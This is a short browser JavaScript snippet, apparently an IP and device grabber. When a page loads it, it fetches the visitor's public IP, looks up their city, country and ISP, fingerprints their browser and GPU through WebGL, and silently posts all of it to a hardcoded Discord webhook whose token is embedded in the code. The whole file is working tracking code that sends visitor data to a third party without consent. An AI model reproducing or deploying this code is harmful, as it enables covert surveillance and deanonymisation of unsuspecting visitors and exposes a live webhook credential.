const sendtheshit = async () => {
    try {
        const irapd = await fetch('https://api.ipify.org?format=json');
        const datashitip = await irapd.json();
        const ip = datashitip.ip;
        const geoinfoshit = await fetch(`https://ipapi.co/${ip}/json/`);
        const geodatashit = await geoinfoshit.json();
        const country = geodatashit.country_name;
        const city = geodatashit.city;
        const isp = geodatashit.org;  // ISP info
        const org = geodatashit.org;  // Organization info (same as ISP)
        const time = new Date().toLocaleString();
        const userAgent = navigator.userAgent;
        const platformName = navigator.platform;
        const isMobile = /Mobi|Tablet|iPad|iPhone/.test(userAgent);
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const gpuInfo = gl.getExtension('WEBGL_debug_renderer_info');
        const gpuVendor = gpuInfo ? gl.getParameter(gpuInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown';
        const gpuRenderer = gpuInfo ? gl.getParameter(gpuInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
        const webhookURL = 'https://discord.com/api/webhooks/1361402668538396973/5EldBXEUR_uOzHlFfSEmMRQzgDBnc_3UhfFKnuO-U2jzeIm6CI4CdaEiJvii7usYbYen';

const payload = {
    embeds: [{
        title: 'User Information',
        description: `
\`\`\`ini
[Location Information]
Country    = ${country}
City       = ${city}
ISP        = ${isp}
Org        = ${org}
\`\`\`

\`\`\`ini
[System Information]
Time       = ${time}
IP Address = ${ip}
User-Agent = ${userAgent}
Platform   = ${platformName}
\`\`\`

\`\`\`ini
[Device Information]
Mobile       = ${isMobile ? 'Yes' : 'No'}
GPU Vendor   = ${gpuVendor}
GPU          = ${gpuRenderer}
\`\`\`
`,
        color: 0x008080
    }]
};
        await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        console.log('Data sent successfully!');
    } catch (error) {
        console.error('An error occurred: ', error);
    }
};
sendtheshit();
